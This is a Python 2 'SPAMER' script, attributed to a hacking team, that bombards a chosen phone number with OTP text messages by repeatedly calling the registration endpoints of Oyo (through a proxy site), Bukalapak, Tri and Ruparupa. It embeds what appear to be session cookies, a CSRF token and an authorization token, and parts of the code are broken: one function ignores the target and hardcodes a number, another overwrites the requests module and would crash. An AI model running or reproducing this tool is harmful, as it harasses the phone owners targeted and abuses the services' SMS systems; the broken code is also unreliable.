#!/usr/bin/python2
# coding=utf-8
import requests as r
import sys,os,time,random,json

G = '\x1b[0;32m'
GL = '\x1b[32;1m'
B = '\x1b[0;36m'
P = '\x1b[35;1m'
BL = '\x1b[36;1m'
BD = '\x1b[34;1m'
R = '\x1b[31;1m'
W = '\x1b[37;1m'
H = '\x1b[30;1m'
Y = '\x1b[33;1m'
YL = '\x1b[1;33m'


logo = '''{}
 _____ _____ _____ _____ _____ _____ 
|   __|  _  |  _  |     |   __| __  |
|__   |   __|     | | | |   __|    -|
|_____|__|  |__|__|_|_|_|_____|__|__|
                                     
{}Author : {}sCuby07
{}Team   : {}Cyber Ghost Indonesia
'''.format(R,W,BL,W,GL)


def oyo():
    m = 0
    n = 0
    no = raw_input("{}Nomer Target : {}".format(GL,W))
    ju = int(raw_input("{}Jumlah Spam : {}".format(GL,W)))
    dl = raw_input("{}Delay : {}".format(GL,W))
    print BL + '═' *35
    p = {
	'Host': 'masterkadal.com',
	'accept': 'application/json, text/plain, */*',
	'save-data': 'on',
	'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36',
	'referer': 'https://masterkadal.com/tools/oyo/'
    }
    for z in range(ju):
	v = r.get('https://masterkadal.com/api/oyo/?nomer=895611982226',headers = p).json()
	if "SMS berhasil dikirim." in v["msg"]:
		print '{}{} {}[{}SEND{}] [{}✓{}]'.format(W,no,W,GL,W,GL,W)
                time.sleep(int(dl))
                m -=- 1
	else:
		print '{}{} {}[{}FAIL{}] [{}×{}]'.format(W,no,W,R,W,R,W)
                time.sleep(int(dl))
                n -=- 1
    print BL + '═' *35
    print '\x1b[37;1mSUCCES : ' + GL + str(m) + W + " FAILED : " + R + str(n)
    print BL + '═' *35 + W

def buka():
   h = 0
   j = 0
   no = raw_input("{}Nomer Target : {}".format(GL,W))
   ju = raw_input("{}Jumlah Spam : {}".format(GL,W))
   dl = raw_input("{}Delay : {}".format(GL,W))
   print BL + '═' *35
   data = {
    'feature':'phone_registration',
    'feature_tag':'',
    'manual_phone':no,
    'channel':'SMS',
    'is reskin':'true',
    'device_fingerprint':'80fc69a69fa4cccea0d9271b9b5377c5'
   }
   head = {
    'Host': 'm.bukalapak.com',
    'content-length': '145',
    'x-newrelic-id': 'VQcDWF9ADgIJVVBQ',
    'origin': 'https://m.bukalapak.com',
    'x-csrf-token': 'HDakj5+4Xo28K7A3+M55Kjbm7qi97dpl6hNLWO++sbcqhi+ZG1oTY3UKPG5aleoxQHbVqMG34pjpYqg+xr8EJA==',
    'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'save-data': 'on',
    'referer': 'https://m.bukalapak.com/register?from=home_mobile',
    'Cookie':'identity=ba1c134224b94c846a4705d5d6f7130f;browser_id=06b3da643e9f103550a4453009a84c06;_ga=GA1.2.1433061458.1580684400;_gcl_au=1.1.2126925204.1580684401;_vwo_uuid_v2=DB9AF867CDE7D270F61D0F15745875CAD|a4c172803aedbab18226481c257c7d2c;_fbp=fb.1.1580684416409.2061456332;kppid_managed=NNAcyoMd;__auc=8a22edbf1701f355368e9b9f9ba;_gid=GA1.2.2067220299.1581071558;_gcl_aw=GCL.1581071591.Cj0KCQiAsvTxBRDkARIsAH4W_j-FUKnevJNggDQ-ZAT4XH-nhWz0fQh71MANIdd2SZI_zJmlAuIoUmUaAm07EALw_wcB;cto_bundle=RwRG519Dcmh5RXJERHIlMkI3VGt6cXFsYThvTWhReDB5T3hyV3ZpTE5QNGZkSnRQems5TiUyRnVCU285cXBFWWhsciUyQjJWeU9kZ3lXQmNsYkVGSCUyQjlTeTF2YzlyTUFlRDMlMkIzTU9QSHlPeElXTWl4QW1OSnE2UGRzd0dmNjNSS3hyWiUyRllvM2oyJTJGc0V2RDdXbzdGeEk1YXliemNEOTdFUSUzRCUzRA;auth.strategy=bukalapak;session_id=402d729bb97626f211bf5c7d637729f4;_gac_UA-12425854-1=1.1581127745.Cj0KCQiAsvTxBRDkARIsAH4W_j_lN4U5eL9bP13RykksHAeJZPAMQ7rFnCrTKnNiyffi8cfQv5XXCLgaAp4eEALw_wcB;__cfduid=d58540a60f2ee01293d04f50c154cbbde1581127746;__session:0.2651600709732702:=https:;_gat=1;_td=52ec4eba-a2dd-4554-ac6f-c3e1ec780b1e;_mkra_ctxt=69ab7e5e4830453599ccf10a7db959e7--200;lskjfewjrh34ghj23brjh234=K1dRajhKQlZvZFVPdTdqRkppMnQ5ZjRKejVHeHVReXJTamRFZUlqM2F2Wk1YVThHaSsrZVV4V0pncThFRVBtTlNORHJOamM1b1FubG1pVGhob2Q2akg1QndUQmlPMnJWM0YxVjBSOGxPVW91WGJzUjJCR3IyS0lXMFFKcXNzbzkrUy9MeUtQdFZTMUxHb084ZUk3ZWx2MWMvS3NZUFdKWjRoSUhNQmc4ZHVMb1dZdGZKbDNIMGMrZnFwQmQxekpSLS1EenY2MDRQdVRlek1vYmJGL21XVUxRPT0%3D--a8822f3b786f54f169504da49433f550b1c9284a'
   }
   for k in range(int(ju)):
	 f = r.post('https://m.bukalapak.com/trusted_devices/otp_request', headers = head, data = data).json()
	 if "failed" in f["status"]:
		print '{}{} {}[{}FAIL{}] [{}×{}]'.format(W,no,W,R,W,R,W)
		time.sleep(int(dl))
		h -=- 1
 	 else:
		print '{}{} {}[{}SEND{}] [{}✓{}]'.format(W,no,W,GL,W,GL,W)
                time.sleep(int(dl))
                j -=- 1
   print BL + '═' *35
   print '\x1b[37;1mSUCCES : ' + GL + str(j) + W + " FAILED : " + R + str(h)
   print BL + '═' *35 + W

def tri():
   try:
   	no = raw_input("{}Nomer Target : {}".format(GL,W))
   	hit = len(no)
   	if hit < 10:
		print "Masukan Nomer!"
		time.sleep(3)
		main()
  	ju = raw_input("{}Jumlah Spam : {}".format(GL,W))
   	dl = raw_input("{}Delay : {}".format(GL,W))
   	print BL + '═' *35
   	data = {
    	  "msisdn":no,
    	  "imei":"WebSelfcare"
   	}
   	head = {
	    "Host": "www.bima.tri.co.id",
	    "Connection": "keep-alive",
	    "Content-Length": "47",
	    "Accept": "application/json, text/plain, */*",
	    "Origin": "https://www.bima.tri.co.id",
	    "Authorization": "Bearer",
	    "Save-Data": "on",
	    "User-Agent": "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36",
	    "Content-Type": "application/json",
	    "Referer": "https://www.bima.tri.co.id/login"
 	}
   	e = 0
	o = 0
   	for t in range(int(ju)):
		d = r.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = data).text
		if '200' in str(d):
			print '{}{} {}[{}SEND{}] [{}✓{}]'.format(W,no,W,GL,W,GL,W)
			time.sleep(int(dl))
			e -=- 1
		else:
			print '{}{} {}[{}FAIL{}] [{}×{}]'.format(W,no,W,R,W,R,W)
                	time.sleep(int(dl))
                	o -=- 1
	print BL + '═' *35
	print '\x1b[37;1mSUCCES : ' + GL + str(e) + W + " FAILED : " + R + str(o)
	print BL + '═' *35 + W
   except KeyboardInterrupt:
		sys.exit


def main():
    os.system('clear')
    print logo + '\n'
    print BL + '═' *35 + W + '\n      1. Oyo Hotel\n      2. Ruparupa\n      3. Spam Tri\n      4. Bukalapak\n' + BL +'═'*35
    oi = raw_input("{}Spam > ".format(W))
    print BL + '═' *35
    if oi == "1":
	oyo()
    elif oi == "2":
	rprp()
    elif oi == "3":
	tri()
    elif oi == "4":
	buka()

def rprp():
   no = raw_input("{}Nomer Target : {}".format(GL,W))
   ju = raw_input("{}Jumlah Spam : {}".format(GL,W))
   dl = raw_input("{}Delay : {}".format(GL,W))
   print 'Limit : 10'
   print BL + '═' *35
   headers_1 = {
			
	'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10',
	'Accept' : 'application/json',
	'Origin' : 'https://m.ruparupa.com',
	'Referer' : 'https://m.ruparupa.com/my-account',
	'authorization' : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0',
	'x-company-name' : 'odi'
			
   }
			
   data_1 = {
			
	'phone' : no,
	'email' : 'jejak@gmail.com',
	'action' : 'register',
	'password' : ''
			
   }
			
   headers_2 = {
			
	'authorization' : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0',
	'x-company-name' : 'odi', 
	'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10',
	'Origin' : 'https://m.ruparupa.com',
	'referer' : 'https://m.ruparupa.com/verification?page=otp-choices',
	'accept-encoding' : 'gzip, deflate, br' 
			
   }
			
   data_2 = {
			
	'phone' : no,
	'action' : 'register',
	'channel' : 'chat',
	'email' : '',
	'customer_id' : '0',
	'is_resend' : 0
			
   }
			
   url_1 = 'https://wapi.ruparupa.com/auth/check-otp-auth'
   url_2 = 'https://wapi.ruparupa.com/auth/generate-otp'
	
   z = 0
   r = 0
   for a in range(int(ju)):
	sending_1 = r.post(url_1, headers = headers_1, data = data_1)
        sending_2 = r.post(url_2, headers = headers_2, data = data_2)

        if 'tunggu 1x24 jam' in sending_2.text:
		print '{}{} {}[{}FAIL{}] [{}×{}]'.format(W,no,W,R,W,R,W)
		time.sleep(int(dl))
		z -=- 1
	else:
		print '{}{} {}[{}SEND{}] [{}✓{}]'.format(W,no,W,GL,W,GL,W)
		time.sleep(int(dl))
                r -=- 1
   print BL + '═' *35
   print '\x1b[37;1mSUCCES : ' + GL + str(z) + W + " FAILED : " + R + str(r)
   print BL + '═' *35 + W



if __name__ == '__main__':
	main()
